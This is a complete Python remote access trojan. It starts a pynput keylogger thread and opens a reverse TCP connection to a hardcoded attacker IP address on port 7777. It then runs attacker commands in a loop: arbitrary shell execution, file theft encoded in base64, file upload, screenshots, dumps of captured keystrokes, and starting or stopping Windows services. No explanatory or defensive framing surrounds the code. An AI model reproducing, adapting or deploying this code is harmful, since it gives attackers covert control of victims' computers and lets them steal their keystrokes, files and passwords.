import socket
import subprocess
import os
import base64
from pynput import keyboard
import threading
import pyautogui

# Define the attacker's IP address and port
ATTACKER_IP = '159.65.152.59'  # Replace with the attacker's IP address
ATTACKER_PORT = 7777            # Replace with the attacker's listening port

# Global variable to store keystrokes
keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f"[{key.name}]")

def keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def open_notepad_with_text(text):
    temp_file = "temp.txt"
    with open(temp_file, "w") as file:
        file.write(text)
    subprocess.Popen(["notepad.exe", temp_file])

def capture_screenshot(filename):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        return f"Screenshot saved as {filename}"
    except Exception as e:
        return str(e)

def save_keystrokes(filename):
    try:
        with open(filename, "a") as file:
            file.write(''.join(keystrokes) + '\n')
        keystrokes.clear()  # Clear the list after saving
        return f"Keystrokes saved to {filename}"
    except Exception as e:
        return str(e)

def connect_back():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Send basic information about the target system
        system_info = os.name + " " + os.getenv('COMPUTERNAME')
        s.send(system_info.encode("utf-8"))

        while True:
            # Receive the command from the attacker
            command = s.recv(1024).decode("utf-8").strip()

            if command.lower() == 'exit':
                break

            elif command.lower().startswith('cd'):
                try:
                    os.chdir(command[3:])
                    result = f"Changed directory to {os.getcwd()}"
                except FileNotFoundError:
                    result = "Directory not found"
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('download'):
                try:
                    filepath = command[9:].strip()
                    if os.path.exists(filepath):
                        with open(filepath, "rb") as file:
                            encoded_file = base64.b64encode(file.read()).decode("utf-8")
                            s.send(encoded_file.encode("utf-8"))
                    else:
                        s.send("File not found".encode("utf-8"))
                except Exception as e:
                    s.send(str(e).encode("utf-8"))

            elif command.lower().startswith('upload'):
                try:
                    _, filename, filedata = command.split(' ')
                    with open(filename, "wb") as file:
                        file.write(base64.b64decode(filedata))
                    result = f"Uploaded {filename}"
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('get_keys'):
                try:
                    _, filename = command.split(' ', 1)
                    result = save_keystrokes(filename)
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('open_notepad'):
                try:
                    _, text = command.split(' ', 1)
                    open_notepad_with_text(text)
                    result = "Notepad opened with text"
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('screenshot'):
                try:
                    _, filename = command.split(' ', 1)
                    result = capture_screenshot(filename)
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('run'):
                try:
                    _, cmd = command.split(' ', 1)
                    result = subprocess.getoutput(cmd)
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('list_files'):
                try:
                    _, directory = command.split(' ', 1)
                    result = '\n'.join(os.listdir(directory))
                except Exception as e:
                    result = str(e)

            elif command.lower() == 'get_system_info':
                try:
                    info = f"OS: {os.name}, Computer: {os.getenv('COMPUTERNAME')}"
                    s.send(info.encode("utf-8"))
                    continue
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('execute_script'):
                try:
                    _, script_path = command.split(' ', 1)
                    with open(script_path, 'r') as file:
                        script = file.read()
                    result = subprocess.getoutput(f"python -c \"{script}\"")
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('start_service'):
                try:
                    _, service_name = command.split(' ', 1)
                    result = subprocess.getoutput(f"sc start {service_name}")
                except Exception as e:
                    result = str(e)

            elif command.lower().startswith('stop_service'):
                try:
                    _, service_name = command.split(' ', 1)
                    result = subprocess.getoutput(f"sc stop {service_name}")
                except Exception as e:
                    result = str(e)

            else:
                try:
                    result = subprocess.getoutput(command)
                except Exception as e:
                    result = str(e)
                
            s.send(result.encode("utf-8"))
        
    except Exception as e:
        s.send(str(e).encode("utf-8"))
    finally:
        s.close()

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    connect_back()
